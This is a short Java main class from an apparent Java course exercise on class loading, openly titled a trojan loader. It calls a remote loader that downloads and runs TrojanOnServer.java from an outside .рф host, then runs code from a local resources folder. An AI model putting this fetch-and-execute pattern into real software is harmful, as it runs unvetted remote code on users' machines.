package com.sbt.javaschool.rnd.lesson7trojanloader;

import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.AllLoadersInterface;
import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.TrCompiler;
import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.TrojanFromRemoteServerLoader;
import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.TrojanLocalLoader;
import com.sbt.javaschool.rnd.lesson7trojanloader.sms.SmsRuSender;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;

public class Main {
    public static void main(String[] args) {

        //read readme.md :-)

        AllLoadersInterface loaderRem = new TrojanFromRemoteServerLoader();
        loaderRem.loadAndRun("http://xn--80aalwafjm2a3l.xn--p1ai/TrojanOnServer.java");
        AllLoadersInterface loaderLoc = new TrojanLocalLoader();
        loaderLoc.loadAndRun(System.getProperty("user.dir")
                            +System.getProperty("file.separator")
                               +"src"+System.getProperty("file.separator")
                                    +"main"+System.getProperty("file.separator")
                                        +"resources");
    }
}
